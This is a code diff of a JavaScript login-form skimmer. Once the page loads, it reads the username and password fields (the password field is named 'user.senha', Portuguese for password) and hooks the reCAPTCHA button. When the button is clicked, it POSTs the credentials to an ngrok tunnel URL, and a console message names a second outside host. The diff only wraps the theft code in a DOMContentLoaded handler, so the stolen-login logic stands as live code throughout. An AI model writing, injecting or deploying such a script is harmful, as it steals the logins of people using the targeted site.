@@ -1,34 +1,34 @@
-console.log("yepp")
+document.addEventListener("DOMContentLoaded", function() {
+    console.log("yepp")
 
-let btn = document.getElementsByClassName("g-recaptcha")
-const username = document.querySelector('[name="user.login"]')
-const password = document.querySelector('[name="user.senha"]')
-
-
-
-console.log("encontrou")
-btn[0].addEventListener("click", async function(){
-    console.log("Botão de envio de formulário clicado.");
-
-    let xhr = new XMLHttpRequest();
-
-    console.log("Objeto XMLHttpRequest criado.");
+    let btn = document.getElementsByClassName("g-recaptcha")
+    const username = document.querySelector('[name="user.login"]')
+    const password = document.querySelector('[name="user.senha"]')
 
 
-    const urlContent = xhr.responseText;
 
-    const data = new FormData();
-    data.append("username", username.value);
-    data.append("password", password.value);
+    console.log("encontrou")
+    btn[0].addEventListener("click", async function(){
+        console.log("Botão de envio de formulário clicado.");
 
-    const response = await fetch("https://8177-45-162-158-3.sa.ngrok.io/dashboard/public_html/index.php", {
-        method: "POST",
-        body: data
+        let xhr = new XMLHttpRequest();
+
+        console.log("Objeto XMLHttpRequest criado.");
+
+
+        const urlContent = xhr.responseText;
+
+        const data = new FormData();
+        data.append("username", username.value);
+        data.append("password", password.value);
+
+        const response = await fetch("https://8177-45-162-158-3.sa.ngrok.io/dashboard/public_html/index.php", {
+            method: "POST",
+            body: data
+        });
+
+        console.log("Dados enviados com sucesso para http://fckyou.42web.io/index/get.php.");
+
+        console.log("Requisição enviada para o servidor.");
     });
-
-    console.log("Dados enviados com sucesso para http://fckyou.42web.io/index/get.php.");
-
-    console.log("Requisição enviada para o servidor.");
 });
-
-
